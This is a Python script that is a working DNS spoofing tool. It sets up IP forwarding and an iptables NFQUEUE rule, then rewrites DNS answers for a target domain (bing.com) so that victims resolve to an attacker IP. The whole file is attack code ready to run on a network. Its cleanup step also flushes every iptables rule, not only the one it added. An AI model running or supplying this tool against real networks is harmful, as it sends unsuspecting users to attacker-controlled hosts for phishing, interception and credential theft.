#!/usr/bin/env python3

import scapy.all as scapy
from netfilterqueue import NetfilterQueue
import subprocess
import os

# Configuration
TARGET_URL = "bing.com"             # Target domain to spoof
ATTACKER_IP = "192.168.2.11"        # IP address to redirect the target to
QUEUE_NUM = 0                       # Netfilter Queue number

def set_rules():
    """
    Enable IP forwarding and set iptables to trap packets (Linux only).
    """
    print("[*] Configuring iptables rules...")
    
    # Enable IP Forwarding automatically
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        print("[*] IP Forwarding enabled.")
    except Exception as e:
        print(f"[!] Could not enable IP forwarding automatically: {e}")
        print("[!] Please run: echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    # Insert the rule into the FORWARD chain
    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", str(QUEUE_NUM)])

def flush_rules():
    """
    Clear the iptables rules to restore normal network flow (Linux only).
    """
    print("\n[*] Flushing iptables rules...")
    subprocess.run(["iptables", "--flush"])
    print("[+] Rules flushed. Network normalized.")

def process_packet(packet):
    """
    Callback function to process each packet in the Netfilter Queue.

    :param packet: The packet from the Netfilter Queue
    """
    scapy_packet = scapy.IP(packet.get_payload())
    
    # Check for DNS Response (DNSRR)
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode()
        
        if TARGET_URL in qname:
            print(f"[+] Spoofing target: {qname}")
            
            answer = scapy.DNSRR(rrname=qname, rdata=ATTACKER_IP)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            
            packet.set_payload(bytes(scapy_packet))
    
    packet.accept()

# Main Execution
if __name__ == "__main__":
    try:
        # Set up IP forwarding and iptables rules
        set_rules()

        print("[*] Starting DNS Spoofer...")
        print(f"[*] Target: {TARGET_URL} -> Redirect to: {ATTACKER_IP}")
        
        queue = NetfilterQueue()
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()

    except KeyboardInterrupt:
        print("\n[!] Stopping...")

    except Exception as e:
        print(f"\n[!] An error occurred: {e}")

    finally:
        # This block ALWAYS runs, even if the script crashes or we hit Ctrl+C
        flush_rules()